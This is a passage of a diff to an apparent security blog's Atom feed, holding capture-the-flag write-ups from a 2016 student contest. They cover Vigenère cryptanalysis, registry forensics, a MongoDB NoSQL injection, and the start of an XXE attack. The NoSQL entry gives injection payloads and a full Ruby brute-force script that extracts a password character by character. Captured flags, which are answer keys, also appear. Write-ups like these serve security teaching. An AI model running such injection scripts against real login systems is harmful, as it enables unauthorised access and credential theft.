class="string">'https://challenge-ecw.fr/chals/web200'</span></div><div class="line">nonce = <span class="string">'myNonce'</span></div><div class="line"></div><div class="line">c = Curl::Easy.new(hostname) <span class="keyword">do</span> <span class="params">|curl|</span></div><div class="line">  curl.headers[<span class="string">'Cookie'</span>] = <span class="string">'session=mySessionCookie'</span></div><div class="line">  curl.headers[<span class="string">'Referer'</span>] = hostname</div><div class="line">  curl.headers[<span class="string">'Host'</span>] = <span class="string">'challenge-ecw.fr'</span></div><div class="line">  curl.headers[<span class="string">'Connection'</span>] = <span class="string">'keep-alive'</span></div><div class="line">  curl.headers[<span class="string">'Upgrade-Insecure-Requests'</span>] = <span class="string">'1'</span></div><div class="line">  <span class="comment">#curl.verbose = true</span></div><div class="line"><span class="keyword">end</span> <span class="comment"># Curl</span></div><div class="line">c.perform <span class="comment"># send the request</span></div><div class="line"></div><div class="line"><span class="keyword">if</span> c.body_str.match(<span class="regexp">/Un nouveau m/</span>)</div><div class="line">  puts <span class="string">'• Connexion to ECW works'</span></div><div class="line"><span class="keyword">end</span></div><div class="line"></div><div class="line">length = <span class="number">32</span> <span class="comment"># md5(hash)</span></div><div class="line"></div><div class="line"><span class="comment"># Find each char of the password one by one</span></div><div class="line">answer = <span class="string">""</span></div><div class="line">ECW_flag_alphabet_array = (<span class="string">'a'</span>..<span class="string">'f'</span>).to_a + (<span class="number">0</span>.to_s..<span class="number">9</span>.to_s).to_a <span class="comment"># md5(hash)</span></div><div class="line">(<span class="number">1</span>..length).each <span class="keyword">do</span> <span class="params">|offset|</span></div><div class="line">  ECW_flag_alphabet_array.each <span class="keyword">do</span> <span class="params">|char|</span></div><div class="line">    c.http_post(Curl::PostField.content(<span class="string">'password[$regex]'</span>, <span class="string">"ECW&#123;<span class="subst">#&#123;answer&#125;</span><span class="subst">#&#123;char&#125;</span>.&#123;<span class="subst">#&#123;length - offset&#125;</span>&#125;&#125;"</span>),</div><div class="line">                Curl::PostField.content(<span class="string">'nonce'</span>, nonce))</div><div class="line">    c.perform</div><div class="line">    <span class="keyword">if</span> c.body_str.match(<span class="regexp">/Authentification valide\. Le mot de passe est le flag\./</span>)</div><div class="line">      answer.concat(char)</div><div class="line">      puts <span class="string">"Password: ECW&#123;<span class="subst">#&#123;answer&#125;</span>&#125;"</span></div><div class="line">      <span class="keyword">break</span></div><div class="line">    <span class="keyword">else</span></div><div class="line">      puts <span class="string">"Tried: ECW&#123;<span class="subst">#&#123;answer&#125;</span><span class="subst">#&#123;char&#125;</span>&#125;"</span></div><div class="line">    <span class="keyword">end</span></div><div class="line">  <span class="keyword">end</span></div><div class="line"><span class="keyword">end</span></div></pre></td></tr></table></figure>
 ]]></content>
     
     <summary type="html">
@@ -223,66 +318,6 @@
       <category term="security" scheme="http://rawsec.ml/tags/security/"/>
     
       <category term="web" scheme="http://rawsec.ml/tags/web/"/>
-    
-      <category term="writeups" scheme="http://rawsec.ml/tags/writeups/"/>
-    
-      <category term="ctf" scheme="http://rawsec.ml/tags/ctf/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>ECW - 50 - Ave, César! - Cryptography</title>
-    <link href="http://rawsec.ml/en/ECW-2016-ave-cesar/"/>
-    <id>http://rawsec.ml/en/ECW-2016-ave-cesar/</id>
-    <published>2016-11-05T23:00:00.000Z</published>
-    <updated>2016-11-07T21:44:48.247Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="Informations"><a href="#Informations" class="headerlink" title="Informations"></a>Informations</h2><h3 id="Version"><a href="#Version" class="headerlink" title="Version"></a>Version</h3><table>
-<thead>
-<tr>
-<th>By</th>
-<th>Version</th>
-<th>Comment</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>noraj</td>
-<td>1.0</td>
-<td>Creation</td>
-</tr>
-</tbody>
-</table>
-<h3 id="CTF"><a href="#CTF" class="headerlink" title="CTF"></a>CTF</h3><ul>
-<li><strong>Name</strong> : European Cyber Week CTF Quals 2016</li>
-<li><strong>Website</strong> : <a href="https://challenge-ecw.fr/" target="_blank" rel="external">challenge-ecw.fr</a></li>
-<li><strong>Type</strong> : Online</li>
-<li><strong>Format</strong> : Jeopardy - Student</li>
-</ul>
-<h3 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h3><p>N.A.</p>
-<h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>This was not Caesar as title suggested but Vigenere code, a troll I guess…</p>
-<p>With some frequency analysis and bruteforce we found:</p>
-<ul>
-<li>The key was: <code>contest</code>.</li>
-<li>And the message was: <code>remporte cette epreuve grace au flag ecw accolade ouvrante d huit c trois un cinq cinq c huit six a six eef un huit db huit quatre cinq trois un sept b huit b cinq a sept deux accolade fermante. les chiffres et caracteres speciaux ont ete remplaces par leur nom textuel.</code>.</li>
-<li>That gave us the flag: <code>ECW{d8c3155c86a6eef18db845317b8b5a72}</code>.</li>
-</ul>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;h2 id=&quot;Informations&quot;&gt;&lt;a href=&quot;#Informations&quot; class=&quot;headerlink&quot; title=&quot;Informations&quot;&gt;&lt;/a&gt;Informations&lt;/h2&gt;&lt;h3 id=&quot;Version&quot;&gt;&lt;a href=&quot;#Versio
-    
-    </summary>
-    
-      <category term="security" scheme="http://rawsec.ml/categories/security/"/>
-    
-      <category term="writeups" scheme="http://rawsec.ml/categories/security/writeups/"/>
-    
-    
-      <category term="security" scheme="http://rawsec.ml/tags/security/"/>
-    
-      <category term="crypto" scheme="http://rawsec.ml/tags/crypto/"/>
     
       <category term="writeups" scheme="http://rawsec.ml/tags/writeups/"/>
     
@@ -359,6 +394,66 @@
       <category term="ctf" scheme="http://rawsec.ml/tags/ctf/"/>
     
       <category term="misc" scheme="http://rawsec.ml/tags/misc/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>ECW - 50 - Ave, César! - Cryptography</title>
+    <link href="http://rawsec.ml/en/ECW-2016-ave-cesar/"/>
+    <id>http://rawsec.ml/en/ECW-2016-ave-cesar/</id>
+    <published>2016-11-05T23:00:00.000Z</published>
+    <updated>2016-11-07T21:44:48.247Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="Informations"><a href="#Informations" class="headerlink" title="Informations"></a>Informations</h2><h3 id="Version"><a href="#Version" class="headerlink" title="Version"></a>Version</h3><table>
+<thead>
+<tr>
+<th>By</th>
+<th>Version</th>
+<th>Comment</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>noraj</td>
+<td>1.0</td>
+<td>Creation</td>
+</tr>
+</tbody>
+</table>
+<h3 id="CTF"><a href="#CTF" class="headerlink" title="CTF"></a>CTF</h3><ul>
+<li><strong>Name</strong> : European Cyber Week CTF Quals 2016</li>
+<li><strong>Website</strong> : <a href="https://challenge-ecw.fr/" target="_blank" rel="external">challenge-ecw.fr</a></li>
+<li><strong>Type</strong> : Online</li>
+<li><strong>Format</strong> : Jeopardy - Student</li>
+</ul>
+<h3 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h3><p>N.A.</p>
+<h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>This was not Caesar as title suggested but Vigenere code, a troll I guess…</p>
+<p>With some frequency analysis and bruteforce we found:</p>
+<ul>
+<li>The key was: <code>contest</code>.</li>
+<li>And the message was: <code>remporte cette epreuve grace au flag ecw accolade ouvrante d huit c trois un cinq cinq c huit six a six eef un huit db huit quatre cinq trois un sept b huit b cinq a sept deux accolade fermante. les chiffres et caracteres speciaux ont ete remplaces par leur nom textuel.</code>.</li>
+<li>That gave us the flag: <code>ECW{d8c3155c86a6eef18db845317b8b5a72}</code>.</li>
+</ul>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h2 id=&quot;Informations&quot;&gt;&lt;a href=&quot;#Informations&quot; class=&quot;headerlink&quot; title=&quot;Informations&quot;&gt;&lt;/a&gt;Informations&lt;/h2&gt;&lt;h3 id=&quot;Version&quot;&gt;&lt;a href=&quot;#Versio
+    
+    </summary>
+    
+      <category term="security" scheme="http://rawsec.ml/categories/security/"/>
+    
+      <category term="writeups" scheme="http://rawsec.ml/categories/security/writeups/"/>
+    
+    
+      <category term="security" scheme="http://rawsec.ml/tags/security/"/>
+    
+      <category term="crypto" scheme="http://rawsec.ml/tags/crypto/"/>
+    
+      <category term="writeups" scheme="http://rawsec.ml/tags/writeups/"/>
+    
+      <category term="ctf" scheme="http://rawsec.ml/tags/ctf/"/>
     
   </entry>
   
@@ -504,11 +599,11 @@
   </entry>
   
   <entry>
-    <title>ECW - 150 - Alternative Persistent Threat - Forensics</title>
-    <link href="http://rawsec.ml/en/ECW-2016-Alternative-Persistent-Threat/"/>
-    <id>http://rawsec.ml/en/ECW-2016-Alternative-Persistent-Threat/</id>
+    <title>ECW - 150 - Carnet d&#39;adresses - Web</title>
+    <link href="http://rawsec.ml/en/ECW-2016-carnet-dadresse/"/>
+    <id>http://rawsec.ml/en/ECW-2016-carnet-dadresse/</id>
     <published>2016-11-05T23:00:00.000Z</published>
-    <updated>2016-11-07T21:44:43.303Z</updated>
+    <updated>2016-11-07T21:45:06.257Z</updated>
     
     <content type="html"><![CDATA[<h2 id="Informations"><a href="#Informations" class="headerlink" title="Informations"></a>Informations</h2><h3 id="Version"><a href="#Version" class="headerlink" title="Version"></a>Version</h3><table>
 <thead>
@@ -533,87 +628,38 @@
 <li><strong>Format</strong> : Jeopardy - Student</li>
 </ul>
 <h3 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h3><p>N.A.</p>
-<h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>We used <a href="http://www.arxsys.fr/discover/" target="_blank" rel="external">Digital Forensics Framework (DFF)</a></p>
-<p>We can view that <strong>usb.dd</strong> is NTFS partition in the hex view so we mounted it as it.</p>
-<p>We browsed the files and this one retaind our attention: <code>usb.dd/NTFS/Users/windows/Documents/tmp_rqsu78.docx:flag</code>.</p>
-<p>Its content is:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&apos;Get the data from the default value of the key HKLM\SYSTEM\CurrentControlSet\Control\DeviceContainers\&#123;000001111-2345178-232416-99801&#125;&apos;</div></pre></td></tr></table></figure>
-<p>So we need to find Windows registry and browse it.</p>
-<blockquote>
-<p>The location of these registry hives are as follows:<br><code>HKEY_LOCAL_MACHINE \SYSTEM</code> : <code>\system32\config\system</code></p>
-</blockquote>
-<p>Source: <a href="http://www.thewindowsclub.com/where-are-the-windows-registry-files-located-in-windows-7" target="_blank" rel="external">http://www.thewindowsclub.com/where-are-the-windows-registry-files-located-in-windows-7</a></p>
-<p>We browsed it and the value of the key was: <code>a2486aac827711258d0642176cc4f8c2</code>.</p>
-<p>So the flag is <code>ECW{a2486aac827711258d0642176cc4f8c2}</code>.</p>
-<p><strong>Bonus</strong>:</p>
-<ul>
-<li><code>/Logical files/temp/usb.dd/NTFS/!j3CtfuSD5zz1RfB=MlsL]u-k8O5v+,P</code> was certainly the target location of the attack.</li>
-<li>There was also a <code>no flag here.txt</code> troll file in <code>Windows\system32\config\</code> containing a pretty list of fake flags:</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div></pre></td><td class="code"><pre><div class="line">ECW&#123;ee4f493d149e634540b79ed030b3790e&#125;</div><div class="line">ECW&#123;ef20996f87a1c172223d1796f155cabb&#125;</div><div class="line">ECW&#123;78a4b8dd2614fea24d694aaad4e5ee7c&#125;</div><div class="line">ECW&#123;2942e64a0b3836b84aa18311be73804d&#125;</div><div class="line">ECW&#123;860d8070c9fed931856856b2957316d9&#125;</div><div class="line">ECW&#123;5c07ee2b8313b406a32325c7a2924011&#125;</div><div class="line">ECW&#123;20b1ab287f9f4485800b15ba9cb933b0&#125;</div><div class="line">ECW&#123;31470d8d9676ee5d17fe79317124d67a&#125;</div><div class="line">ECW&#123;c0ad5adadd6dc5871f4cc66370757d9a&#125;</div><div class="line">ECW&#123;d28aeba8bb169a6f628d77b7059e9110&#125;</div><div class="line">ECW&#123;c9f619827e73ce3d61048b0ddb49ec84&#125;</div><div class="line">ECW&#123;07c563dd9f91b19a18d8876e89188593&#125;</div><div class="line">ECW&#123;46f8ba8cd62e3334e05501407d653587&#125;</div><div class="line">ECW&#123;d55e0d52fa7c5ccb0af9efa488f5206d&#125;</div><div class="line">ECW&#123;269c20f280f7326c674811f59ece9cab&#125;</div><div class="line">ECW&#123;656122abbb817863ae145539bb0eeb03&#125;</div><div class="line">ECW&#123;d1b46e0fa5e5c0375ade62ff820ce631&#125;</div><div class="line">ECW&#123;62fd1f329ac8d59e6c4052e45b6121bf&#125;</div><div class="line">ECW&#123;c4393a542ae85e178cf7da6cee80139d&#125;</div><div class="line">ECW&#123;0ae1fcf8c1b5e378ba62736d59ab346c&#125;</div><div class="line">ECW&#123;31e42f6a1adeb6350cda9270c164855f&#125;</div><div class="line">ECW&#123;6a1dd34361fe943af6a4c4a71584ac2f&#125;</div><div class="line">ECW&#123;bc65d36be9d0c6877cc0b200002e4e2d&#125;</div><div class="line">ECW&#123;a0a7c3fff21f2aea3cfa1d0316dd816c&#125;</div><div class="line">ECW&#123;4cf2d64e44205fe628ddd534e1151b58&#125;</div><div class="line">ECW&#123;9cc72dc973e24f9623bd3fe708f60ef5&#125;</div><div class="line">ECW&#123;579a3c1e12a1e74a98169175fb913012&#125;</div><div class="line">ECW&#123;2b7ea5cee3c49ff53d41e00785eb974c&#125;</div><div class="line">ECW&#123;a4a7e457b55b5ac2877f7973dbba37e9&#125;</div><div class="line">ECW&#123;01b1688f97f94776baae85d77b06048b&#125;</div><div class="line">ECW&#123;9b64ca5761c6de555d7d1b3c948ecfeb&#125;</div><div class="line">ECW&#123;3ff6ba9cf6d8e5332978e057559b5562&#125;</div><div class="line">ECW&#123;7dfe15854212a30f346da5255c1d794b&#125;</div><div class="line">ECW&#123;f51b02427757e79621b5235d7efdf117&#125;</div><div class="line">ECW&#123;e0e8b9912a4793170fd23f7aa4c6d68c&#125;</div><div class="line">ECW&#123;036208b4a1ab4a235d75c181e685e5a3&#125;</div><div class="line">ECW&#123;a51a588dc98a55fbbb26cf2f64589bda&#125;</div><div class="line">ECW&#123;a51a588dc98a55fbbb26cf2f64589bda&#125;</div><div class="line">ECW&#123;a51a588dc98a55fbbb26cf2f64589bda&#125;</div><div class="line">ECW&#123;7fad9816d7334cc470e5dc82d06e222f&#125;</div><div class="line">ECW&#123;d69fc8c97d906264c98463b4bca59fd4&#125;</div><div class="line">ECW&#123;5088741fd5456ef3471fe11022575e03&#125;</div><div class="line">ECW&#123;4d3f80683b3b9021f517e5b9920d0126&#125;</div><div class="line">ECW&#123;73a00957034783b7b5c8294c54cd3e12&#125;</div><div class="line">ECW&#123;1f77c389e0a69652980c341170d0834b&#125;</div><div class="line">ECW&#123;b42d4ed9a6bf5cda33366c01be5d11cb&#125;</div><div class="line">ECW&#123;c9440da5b11074fca7966ecde2fe3c97&#125;</div><div class="line">ECW&#123;6258191d167c56dcdb51ae9fa2faee23&#125;</div><div class="line">ECW&#123;095fd6a167e3c0f7331a1a6b97969c83&#125;</div><div class="line">ECW&#123;40942c14fbaaff0523b88ab781900cfd&#125;</div><div class="line">ECW&#123;39e14ad7477262c347f2e6d927a6518c&#125;</div><div class="line">ECW&#123;cdfb31c9bd2ea0c6d87206224466ac75&#125;</div><div class="line">ECW&#123;663f929002e1547fd2bf67e72f1b85e0&#125;</div><div class="line">ECW&#123;2eedce1bca0150e3dcda7e77f4d8ecfd&#125;</div><div class="line">ECW&#123;35b88728559e409dd550eb818228c99e&#125;</div><div class="line">ECW&#123;469966e739df10b55c3c8ee3ad572617&#125;</div><div class="line">ECW&#123;5146da32deef5fee7df9461eeca13e7b&#125;</div></pre></td></tr></table></figure>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;h2 id=&quot;Informations&quot;&gt;&lt;a href=&quot;#Informations&quot; class=&quot;headerlink&quot; title=&quot;Informations&quot;&gt;&lt;/a&gt;Informations&lt;/h2&gt;&lt;h3 id=&quot;Version&quot;&gt;&lt;a href=&quot;#Versio
-    
-    </summary>
-    
-      <category term="security" scheme="http://rawsec.ml/categories/security/"/>
-    
-      <category term="writeups" scheme="http://rawsec.ml/categories/security/writeups/"/>
-    
-    
-      <category term="security" scheme="http://rawsec.ml/tags/security/"/>
-    
-      <category term="writeups" scheme="http://rawsec.ml/tags/writeups/"/>
-    
-      <category term="ctf" scheme="http://rawsec.ml/tags/ctf/"/>
-    
-      <category term="forensics" scheme="http://rawsec.ml/tags/forensics/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>ECW - 100 - Pas seulement BSON - Web</title>
-    <link href="http://rawsec.ml/en/ECW-2016-pas-seulement-BSON/"/>
-    <id>http://rawsec.ml/en/ECW-2016-pas-seulement-BSON/</id>
-    <published>2016-11-05T23:00:00.000Z</published>
-    <updated>2016-11-07T21:44:57.227Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="Informations"><a href="#Informations" class="headerlink" title="Informations"></a>Informations</h2><h3 id="Version"><a href="#Version" class="headerlink" title="Version"></a>Version</h3><table>
-<thead>
-<tr>
-<th>By</th>
-<th>Version</th>
-<th>Comment</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>noraj</td>
-<td>1.0</td>
-<td>Creation</td>
-</tr>
-</tbody>
-</table>
-<h3 id="CTF"><a href="#CTF" class="headerlink" title="CTF"></a>CTF</h3><ul>
-<li><strong>Name</strong> : European Cyber Week CTF Quals 2016</li>
-<li><strong>Website</strong> : <a href="https://challenge-ecw.fr/" target="_blank" rel="external">challenge-ecw.fr</a></li>
-<li><strong>Type</strong> : Online</li>
-<li><strong>Format</strong> : Jeopardy - Student</li>
-</ul>
-<h3 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h3><p>N.A.</p>
-<h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>This is a <a href="https://www.owasp.org/index.php/Testing_for_NoSQL_injection" target="_blank" rel="external">NoSQL injection</a> on the famous <a href="https://www.mongodb.com/" target="_blank" rel="external">MongoDB</a> with certain <a href="http://www.php.net/manual/en/mongo.security.php" target="_blank" rel="external">PHP</a> at backend.</p>
-<p>We used the <a href="queryOperator">query operators</a> to perform the NoSQLi.</p>
-<p>We tested the following payload in our script with the <a href="https://docs.mongodb.com/manual/reference/operator/query/ne/#op._S_ne" target="_blank" rel="external">ne</a> query operator to confirm presence of the vulnerability:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">password[$ne]=nosql&amp;nonce=myNonce</div></pre></td></tr></table></figure>
-<p>Then we retrieved the password letter by letter with the <a href="https://docs.mongodb.com/manual/reference/operator/query/regex/#op._S_regex" target="_blank" rel="external">regex</a> query operator of NoSQL.<br>At the beginning the script uses the following paylods:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">password[$regex]=ECW&#123;.&#123;32&#125;&#125;&amp;nonce=myNonce</div><div class="line">password[$regex]=ECW&#123;a.&#123;31&#125;&#125;&amp;nonce=myNonce</div><div class="line">password[$regex]=ECW&#123;b.&#123;31&#125;&#125;&amp;nonce=myNonce</div><div class="line">password[$regex]=ECW&#123;c.&#123;31&#125;&#125;&amp;nonce=myNonce</div><div class="line">[...]</div></pre></td></tr></table></figure>
-<p>Each bad request results in an authentification failure and when the right char is found with a succesful authentification, the script with try to find the next chars with something like:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">password[$regex]=ECW&#123;2.&#123;31&#125;&#125;&amp;nonce=myNonce</div><div class="line">password[$regex]=ECW&#123;2a.&#123;30&#125;&#125;&amp;nonce=myNonce</div><div class="line">password[$regex]=ECW&#123;2b.&#123;30&#125;&#125;&amp;nonce=myNonce</div><div class="line">password[$regex]=ECW&#123;2c.&#123;30&#125;&#125;&amp;nonce=myNonce</div><div class="line">[...]</div></pre></td></tr></table></figure>
-<p>So here is our script that we adapted from the first web challenge <em>Authentification</em>.</p>
-<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env ruby</span></div><div class="line"></div><div class="line"><span class="keyword">require</span> <span class="string">'curb'</span> <span class="comment"># for get/post requests</span></div><div class="line"></div><div class="line">hostname = <span class="string">'https://challenge-ecw.fr/chals/web200'</span></div><div class="line">nonce = <span class="string">'myNonce'</span></div><div class="line"></div><div class="line">c = Curl::Easy.new(hostname) <span class="keyword">do</span> <span class="params">|curl|</span></div><div class="line">  curl.headers[<span class="string">'Cookie'</span>] = <span class="string">'session=mySessionCookie'</span></div><div class="line">  curl.headers[<span class="string">'Referer'</span>] = hostname</div><div class="line">  curl.headers[<span class="string">'Host'</span>] = <span class="string">'challenge-ecw.fr'</span></div><div class="line">  curl.headers[<span class="string">'Connection'</span>] = <span class="string">'keep-alive'</span></div><div class="line">  curl.headers[<span class="string">'Upgrade-Insecure-Requests'</span>] = <span class="string">'1'</span></div><div class="line">  <span class="comment">#curl.verbose = true</span></div><div class="line"><span class="keyword">end</span> <span class="comment"># Curl</span></div><div class="line">c.perform <span class="comment"># send the request</span></div><div class="line"></div><div class="line"><span class="keyword">if</span> c.body_str.match(<span class="regexp">/Un nouveau m/</span>)</div><div class="line">  puts <span class="string">'• Connexion to ECW works'</span></div><div class="line"><span class="keyword">end</span></div><div class="line"></div><div class="line">length = <span class="number">32</span> <span class="comment"># md5(hash)</span></div><div class="line"></div><div class="line"><span class="comment"># Find each char of the password one by one</span></div><div class="line">answer = <span class="string">""</span></div><div class="line">ECW_flag_alphabet_array = (<span class="string">'a'</span>..<span class="string">'f'</span>).to_a + (<span class="number">0</span>.to_s..<span class="number">9</span>.to_s).to_a <span class="comment"># md5(hash)</span></div><div class="line">(<span class="number">1</span>..length).each <span class="keyword">do</span> <span class="params">|offset|</span></div><div class="line">  ECW_flag_alphabet_array.each <span class="keyword">do</span> <span class="params">|char|</span></div><div class="line">    c.http_post(Curl::PostField.content(<span class="string">'password[$regex]'</span>, <span class="string">"ECW&#123;<span class="subst">#&#123;answer&#125;</span><span class="subst">#&#123;char&#125;</span>.&#123;<span class="subst">#&#123;length - offset&#125;</span>&#125;&#125;"</span>),</div><div class="line">                Curl::PostField.content(<span class="string">'nonce'</span>, nonce))</div><div class="line">    c.perform</div><div class="line">    <span class="keyword">if</span> c.body_str.match(<span class="regexp">/Authentification valide\. Le mot de passe est le flag\./</span>)</div><div class="line">      answer.concat(char)</div><div class="line">      puts <span class="string">"Password: ECW&#123;<span class="subst">#&#123;answer&#125;</span>&#125;"</span></div><div class="line">      <span class="keyword">break</span></div><div class="line">    <span class="keyword">else</span></div><div class="line">      puts <span class="string">"Tried: ECW&#123;<span class="subst">#&#123;answer&#125;</span><span class="subst">#&#123;char&#125;</span>&#125;"</span></div><div class="line">    <span class="keyword">end</span></div><div class="line">  <span class="keyword">end</span></div><div class="line"><span class="keyword">end</span></div></pre></td></tr></table></figure>
+<h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>This one is a XML External Entity ([XXE][xxe]) attack and Out-Of-Band (OOB) channel exfiltration is not working.</p>
+<p><a href="https://www.gracefulsecurity.com/xml-external-entity-injection-xxe-vulnerabilities/" target="_blank" rel="external">xxe</a></p>
+<p>We are given the following form:</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">contacts</span>&gt;</span></div><div class="line">  <span class="tag">&lt;<span class="name">contact</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>Jean Dupont<span class="tag">&lt;/<span class="name">name</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">phone</span>&gt;</span>00 11 22 33 44<span class="tag">&lt;/<span class="name">phone</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">adress</span>&gt;</span>42 rue CTF<span class="tag">&lt;/<span class="name">adress</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">zipcode</span>&gt;</span>42000<span class="tag">&lt;/<span class="name">zipcode</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">city</span>&gt;</span>ECW<span class="tag">&lt;/<span class="name">city</span>&gt;</span></div><div class="line">  <span class="tag">&lt;/<span class="name">contact</span>&gt;</span></div><div class="line">  <span class="tag">&lt;<span class="name">contact</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>Jack Dupont<span class="tag">&lt;/<span class="name">name</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">phone</span>&gt;</span>01 02 03 04 05<span class="tag">&lt;/<span class="name">phone</span>&gt;</span></div><div class="line">  <span class="tag">&lt;/<span class="name">contact</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">contacts</span>&gt;</span></div></pre></td></tr></table></figure>
+<p>And the following answer confirming the well formated XML request:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">Création du fichier ./MNfloDfo.xml</div><div class="line"></div><div class="line">Import du fichier :</div><div class="line"></div><div class="line">    Importation de &apos;Jean Dupont&apos; dans le carnet d&apos;adresses</div><div class="line">    Importation de &apos;Jack Dupont&apos; dans le carnet d&apos;adresses</div><div class="line"></div><div class="line">Suppression du fichier ./MNfloDfo.xml</div></pre></td></tr></table></figure>
+<p>We should be able to leak data into the answer banner.</p>
+<p>Confirmation that entities are interpreted:</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;!DOCTYPE contacts</span></div><div class="line">[&lt;!ENTITY xxe "XXE vuln"&gt;]&gt;</div><div class="line"><span class="tag">&lt;<span class="name">contacts</span>&gt;</span></div><div class="line">  <span class="tag">&lt;<span class="name">contact</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>&amp;xxe;t<span class="tag">&lt;/<span class="name">name</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">phone</span>&gt;</span>00 11 22 33 44<span class="tag">&lt;/<span class="name">phone</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">adress</span>&gt;</span>42 rue CTF<span class="tag">&lt;/<span class="name">adress</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">zipcode</span>&gt;</span>42000<span class="tag">&lt;/<span class="name">zipcode</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">city</span>&gt;</span>ECW<span class="tag">&lt;/<span class="name">city</span>&gt;</span></div><div class="line">  <span class="tag">&lt;/<span class="name">contact</span>&gt;</span></div><div class="line">  <span class="tag">&lt;<span class="name">contact</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>Jack Dupont<span class="tag">&lt;/<span class="name">name</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">phone</span>&gt;</span>01 02 03 04 05<span class="tag">&lt;/<span class="name">phone</span>&gt;</span></div><div class="line">  <span 